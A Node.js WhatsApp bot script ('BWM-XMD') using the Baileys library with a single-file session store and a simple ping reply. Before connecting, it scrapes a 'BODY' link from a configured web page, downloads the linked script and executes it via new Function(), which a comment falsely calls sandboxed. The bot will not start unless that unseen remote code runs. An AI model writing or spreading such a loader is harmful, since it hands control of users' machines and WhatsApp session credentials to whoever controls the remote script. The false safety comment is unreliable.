
//  [BWM-XMD QUANTUM EDITION]                                           
//  >> A superposition of elegant code states                           
//  >> Collapsed into optimal execution                                
//  >> Scripted by Sir Ibrahim Adams                                    
//  >> Version: 8.3.5-quantum.7

const axios = require('axios');
const cheerio = require('cheerio');
const adams = require("./config");
const { makeWASocket, useSingleFileAuthState } = require('@whiskeysockets/baileys');
const fs = require('fs');

// Session persistence
const { state, saveState } = useSingleFileAuthState('./session.json');

// Improved BODY loader with caching
let BODY_LOADED = false;
async function fetchBODYUrl() {
  if (BODY_LOADED) return true;
  
  try {
    console.log('🌐 Fetching BODY script...');
    const response = await axios.get(adams.BWM_XMD);
    const $ = cheerio.load(response.data);
    const targetUrl = $('a:contains("BODY")').attr('href');

    if (!targetUrl) throw new Error('BODY script URL not found');
    
    console.log('🔗 BODY URL:', targetUrl);
    const scriptResponse = await axios.get(targetUrl);
    
    // Sandboxed evaluation instead of direct eval
    const scriptFn = new Function(scriptResponse.data);
    scriptFn();
    
    BODY_LOADED = true;
    console.log('✅ BODY script executed');
    return true;
  } catch (error) {
    console.error('❌ fetchBODYUrl() failed:', error.message);
    return false;
  }
}

// WhatsApp bot connection
async function connectToWhatsApp() {
  const sock = makeWASocket({
    printQRInTerminal: true,
    logger: console,
    auth: state,
    getMessage: async (key) => {
      return null;
    }
  });

  // Save session on credential updates
  sock.ev.on('creds.update', saveState);

  // Connection events
  sock.ev.on('connection.update', (update) => {
    const { connection, lastDisconnect, qr } = update;
    console.log('🔌 Connection Update:', update);
    
    if (qr) console.log('📢 Scan QR Code to authenticate');
    
    if (connection === 'open') {
      console.log('🤖 Bot connected successfully!');
      // Start your message handlers here
    }
    
    if (connection === 'close') {
      const shouldReconnect = (lastDisconnect?.error?.output?.statusCode !== 401);
      console.log(`Connection closed, ${shouldReconnect ? 'reconnecting' : 'please restart'}`);
      if (shouldReconnect) {
        connectToWhatsApp();
      }
    }
  });

  // Message handling
  sock.ev.on('messages.upsert', async ({ messages }) => {
    const msg = messages[0];
    if (!msg.message || msg.key.fromMe) return;
    
    console.log('📩 Received message from:', msg.key.remoteJid);
    console.log('💬 Content:', JSON.stringify(msg.message, null, 2));
    
    // Example reply
    if (msg.message.conversation?.toLowerCase() === 'ping') {
      await sock.sendMessage(msg.key.remoteJid, { text: 'Pong!' });
    }
  });

  return sock;
}

// Main execution
async function main() {
  try {
    const bodyLoaded = await fetchBODYUrl();
    if (!bodyLoaded) {
      throw new Error('Failed to load BODY script - cannot proceed');
    }
    
    await connectToWhatsApp();
  } catch (error) {
    console.error('❌ Fatal error:', error);
    process.exit(1);
  }
}

// Start the bot
main(); 